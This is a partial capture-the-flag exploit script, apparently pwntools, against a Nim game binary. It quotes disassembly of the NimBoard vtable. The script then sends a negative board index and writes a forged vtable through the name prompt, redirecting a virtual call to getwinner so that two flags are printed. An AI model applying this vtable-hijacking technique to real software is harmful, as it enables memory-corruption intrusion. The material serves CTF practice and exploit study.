...
"""
.data.rel.ro:0000000000408BB8                 public _ZTV8NimBoard ; weak
...
0x408bc8 <_ZTV8NimBoard+16>:    0x0000000000401922      0x0000000000401a0e
0x408bd8 <_ZTV8NimBoard+32>:    0x0000000000401a7c      0x0000000000401ae8
0x408be8 <_ZTV8NimBoard+48>:    0x0000000000401bc2      0x0000000000401c20
0x408bf8 <_ZTV8NimBoard+64>:    0x0000000000401c70      0x0000000000401d82
...
io.sendlineafter(b"Do you want to play with me? y/n ", b"y")
io.sendlineafter(b"Your name, plz\n", b"yty")
io.sendlineafter(b"1: you go first; 2: AI goes first", b"1")

a, b, c = get_3_heap()
heap, takenum = action(a, b, c)
io.sendlineafter(b"which heap? >", heap)
io.sendlineafter(b"how much to take? >", str(takenum).encode())
while True:
...
io.sendlineafter(b"Choose a place for yourself!", b"-2")

# use getwinner to replace evaluation
fake_vtable = flat(0x0000000000401922,
                   0x0000000000401a0e,
                   0x0000000000401a7c,
                   0x0000000000401ae8,
                   0x0000000000401bc2,
...
io.sendlineafter(b"What's your name? > ", fake_vtable)

io.recvuntil(b"here is your gift: ")
flag1 = io.recvline().strip()

io.sendlineafter(b"Do you want another game? y/n", b"y")
io.sendlineafter(b"1: you go first; 2: AI goes first", b"2")
...
io.sendlineafter(b"Choose a place for yourself!", b"0")
io.sendlineafter(b"What's your name? > ", b"yty")
io.recvuntil(b"here is your gift: ")
flag2 = io.recvline().strip()
io.sendlineafter(b"Do you want another game? y/n", b"n")
